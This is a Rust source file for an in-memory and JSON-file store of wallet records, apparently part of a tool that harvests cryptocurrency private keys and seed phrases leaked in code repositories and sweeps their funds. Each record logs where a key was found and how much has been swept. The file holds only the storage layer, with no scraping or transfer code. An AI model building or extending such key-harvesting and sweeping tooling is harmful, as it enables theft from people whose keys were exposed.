use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;
use std::time::Duration;
use tokio::time::sleep;
use tracing::info;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StoredWallet {
    pub address: String,
    pub private_key: String,
    pub seed_phrase: Option<String>,
    pub source_repo: String,
    pub source_commit: String,
    pub source_file: String,
    pub first_seen: String,
    pub last_checked: String,
    pub last_balance: String,
    pub total_swept: f64,
    pub status: String,
}

impl StoredWallet {
    pub fn new(
        address: String,
        private_key: String,
        seed_phrase: Option<String>,
        source_repo: String,
        source_commit: String,
        source_file: String,
    ) -> Self {
        let now = chrono::Utc::now().to_rfc3339();
        Self {
            address,
            private_key,
            seed_phrase,
            source_repo,
            source_commit,
            source_file,
            first_seen: now.clone(),
            last_checked: now,
            last_balance: "0".to_string(),
            total_swept: 0.0,
            status: "monitoring".to_string(),
        }
    }
}

pub struct FileStore {
    wallets: Arc<RwLock<HashMap<String, StoredWallet>>>,
}

impl FileStore {
    pub fn new() -> Arc<Self> {
        let store = Arc::new(Self {
            wallets: Arc::new(RwLock::new(HashMap::new())),
        });
        
        store.load_from_file();
        
        let store_clone = store.clone();
        tokio::spawn(async move {
            loop {
                sleep(Duration::from_secs(60)).await;
                store_clone.save_to_file().await;
            }
        });
        
        store
    }
    
    pub async fn save(&self, wallet: StoredWallet) {
        let address = wallet.address.clone();
        let mut wallets = self.wallets.write().await;
        wallets.insert(address.clone(), wallet);
        info!("💾 Wallet saved: {}", address);
    }
    
    pub async fn get_all(&self) -> Vec<StoredWallet> {
        let wallets = self.wallets.read().await;
        wallets.values().cloned().collect()
    }
    
    pub async fn update_balance(&self, address: &str, balance: &str) {
        let mut wallets = self.wallets.write().await;
        if let Some(wallet) = wallets.get_mut(address) {
            wallet.last_balance = balance.to_string();
            wallet.last_checked = chrono::Utc::now().to_rfc3339();
        }
    }
    
    pub async fn update_after_sweep(&self, address: &str, amount: f64) {
        let mut wallets = self.wallets.write().await;
        if let Some(wallet) = wallets.get_mut(address) {
            wallet.total_swept += amount;
            wallet.last_balance = "0".to_string();
            wallet.last_checked = chrono::Utc::now().to_rfc3339();
        }
    }
    
    async fn save_to_file(&self) {
        let wallets = self.wallets.read().await;
        if let Ok(json) = serde_json::to_string_pretty(&*wallets) {
            let _ = std::fs::write("wallets_backup.json", json);
            info!("📁 Wallets saved to file");
        }
    }
    
    fn load_from_file(&self) {
        if let Ok(content) = std::fs::read_to_string("wallets_backup.json") {
            if let Ok(wallets) = serde_json::from_str::<HashMap<String, StoredWallet>>(&content) {
                // Use try_write ya direct assignment
                let store = self.wallets.clone();
                tokio::spawn(async move {
                    let mut write_guard = store.write().await;
                    *write_guard = wallets;
                    info!("📂 Loaded {} wallets from file", write_guard.len());
                });
            }
        }
    }
}